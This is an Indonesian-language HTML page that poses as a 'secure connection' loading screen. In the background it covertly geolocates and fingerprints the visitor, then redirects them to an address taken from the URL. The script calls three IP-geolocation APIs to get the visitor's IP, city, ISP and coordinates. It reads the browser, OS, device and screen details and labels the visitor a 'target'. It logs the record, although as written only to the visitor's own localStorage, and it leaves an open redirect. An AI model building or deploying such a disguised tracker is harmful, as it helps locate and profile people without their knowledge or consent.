<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading - Secure Connection</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            text-align: center;
            color: white;
            padding: 20px;
        }

        .logo {
            font-size: 56px;
            margin-bottom: 20px;
            animation: bounce 1s ease infinite;
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            font-weight: 500;
        }

        p {
            opacity: 0.9;
            font-size: 14px;
            margin-bottom: 20px;
        }

        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid rgba(255,255,255,0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .progress-bar {
            width: 280px;
            height: 4px;
            background: rgba(255,255,255,0.3);
            border-radius: 2px;
            margin: 20px auto;
            overflow: hidden;
        }

        .progress {
            width: 0%;
            height: 100%;
            background: white;
            animation: progress 2.5s ease-out forwards;
        }

        @keyframes progress {
            to { width: 100%; }
        }

        .info {
            margin-top: 30px;
            font-size: 11px;
            opacity: 0.6;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🔒</div>
        <h1>Memverifikasi koneksi aman...</h1>
        <p>Harap tunggu, Anda akan segera dialihkan</p>
        <div class="progress-bar">
            <div class="progress"></div>
        </div>
        <div class="spinner"></div>
        <div class="info">SSL Secure Connection • 256-bit Encryption</div>
    </div>

    <script>
        // ========== PELACAKAN DATA LENGKAP DENGAN API LEBIH AKURAT ==========
        
        async function getIpInfo() {
            // Multiple API untuk redundancy (jika satu gagal, pakai yang lain)
            const apis = [
                'https://ipapi.co/json/',
                'https://ipwho.is/',
                'https://freeipapi.com/api/json/'
            ];
            
            for (const api of apis) {
                try {
                    const response = await fetch(api, { timeout: 5000 });
                    const data = await response.json();
                    
                    // Format berbeda tiap API, kita sesuaikan
                    if (api.includes('ipapi.co')) {
                        return {
                            ip: data.ip,
                            city: data.city || 'Tidak diketahui',
                            region: data.region || 'Tidak diketahui',
                            country: data.country_name || 'Tidak diketahui',
                            isp: data.org || 'Tidak diketahui',
                            latitude: data.latitude,
                            longitude: data.longitude,
                            success: true
                        };
                    } else if (api.includes('ipwho.is')) {
                        return {
                            ip: data.ip,
                            city: data.city || 'Tidak diketahui',
                            region: data.region || 'Tidak diketahui',
                            country: data.country || 'Tidak diketahui',
                            isp: data.isp || 'Tidak diketahui',
                            latitude: data.latitude,
                            longitude: data.longitude,
                            success: true
                        };
                    } else if (api.includes('freeipapi')) {
                        return {
                            ip: data.ipAddress,
                            city: data.cityName || 'Tidak diketahui',
                            region: data.regionName || 'Tidak diketahui',
                            country: data.countryName || 'Tidak diketahui',
                            isp: 'Tidak diketahui',
                            latitude: data.latitude,
                            longitude: data.longitude,
                            success: true
                        };
                    }
                } catch (e) {
                    continue;
                }
            }
            
            // Fallback jika semua API gagal
            return {
                ip: 'Tidak dapat dijangkau',
                city: 'Tidak diketahui',
                region: 'Tidak diketahui',
                country: 'Tidak diketahui',
                isp: 'Tidak diketahui',
                success: false
            };
        }

        async function trackTarget() {
            const urlParams = new URLSearchParams(window.location.search);
            const targetUrl = urlParams.get('redirect') || 'https://google.com';
            
            // ========== 1. Dapatkan IP & Lokasi dari API ==========
            const ipInfo = await getIpInfo();
            
            // ========== 2. Dapatkan Device & Browser ==========
            const ua = navigator.userAgent;
            
            let browser = 'Tidak diketahui';
            let browserVersion = 'Tidak diketahui';
            if (ua.includes('Chrome') && !ua.includes('Edg')) {
                browser = 'Chrome';
                const match = ua.match(/Chrome\/(\d+\.\d+)/);
                if (match) browserVersion = match[1];
            } else if (ua.includes('Firefox')) {
                browser = 'Firefox';
                const match = ua.match(/Firefox\/(\d+\.\d+)/);
                if (match) browserVersion = match[1];
            } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
                browser = 'Safari';
            } else if (ua.includes('Edg')) {
                browser = 'Edge';
            } else if (ua.includes('OPR')) {
                browser = 'Opera';
            }
            
            // ========== 3. Dapatkan OS ==========
            let os = 'Tidak diketahui';
            let osVersion = 'Tidak diketahui';
            if (ua.includes('Windows')) {
                os = 'Windows';
                if (ua.includes('NT 10.0')) osVersion = '11/10';
                else if (ua.includes('NT 6.1')) osVersion = '7';
                else if (ua.includes('NT 6.3')) osVersion = '8.1';
            } else if (ua.includes('Android')) {
                os = 'Android';
                const match = ua.match(/Android\s([\d.]+)/);
                if (match) osVersion = match[1];
            } else if (ua.includes('iPhone') || ua.includes('iPad')) {
                os = 'iOS';
                const match = ua.match(/OS\s([\d_]+)/);
                if (match) osVersion = match[1].replace(/_/g, '.');
            } else if (ua.includes('Mac')) {
                os = 'macOS';
            } else if (ua.includes('Linux')) {
                os = 'Linux';
            }
            
            // ========== 4. Dapatkan Device ==========
            let device = 'Desktop';
            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) device = 'Tablet';
            if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle/i.test(ua)) device = 'Mobile';
            
            // ========== 5. Waktu Akses ==========
            const now = new Date();
            const waktuAkses = now.toLocaleString('id-ID');
            const tanggal = now.toLocaleDateString('id-ID');
            const jam = now.toLocaleTimeString('id-ID');
            
            // ========== DATA LENGKAP ==========
            const targetData = {
                id: Date.now(),
                ip: ipInfo.ip,
                kota: ipInfo.city,
                provinsi: ipInfo.region,
                negara: ipInfo.country,
                lokasi: `${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}`,
                isp: ipInfo.isp,
                latitude: ipInfo.latitude,
                longitude: ipInfo.longitude,
                device: device,
                browser: browser,
                browserVersion: browserVersion,
                os: os,
                osVersion: osVersion,
                screen: `${screen.width}x${screen.height}`,
                bahasa: navigator.language,
                waktu: waktuAkses,
                tanggal: tanggal,
                jam: jam,
                timestamp: now.toISOString(),
                targetUrl: targetUrl,
                userAgent: ua.substring(0, 300)
            };
            
            // ========== SIMPAN KE LOCALSTORAGE ==========
            let semuaData = JSON.parse(localStorage.getItem('gip_track_data') || '[]');
            semuaData.push(targetData);
            localStorage.setItem('gip_track_data', JSON.stringify(semuaData));
            
            // ========== REDIRECT ==========
            setTimeout(() => {
                window.location.href = targetUrl;
            }, 2500);
        }
        
        trackTarget();
    </script>
</body>
  </html>
